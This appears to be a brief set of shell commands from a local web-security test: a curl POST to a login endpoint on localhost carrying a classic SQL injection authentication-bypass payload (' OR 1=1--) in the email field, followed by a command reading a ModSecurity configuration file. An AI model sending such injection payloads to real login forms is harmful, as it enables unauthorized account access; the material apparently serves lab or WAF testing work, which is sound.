curl -v -X POST http://localhost:8080/#/login \
  -H "Content-Type: application/json" \
  --data '{"email":"'\'' OR 1=1--", "password":"any-password"}' \
  -o response2.html


  --- 

  cat /etc/modsecurity.d/modsecurity.conf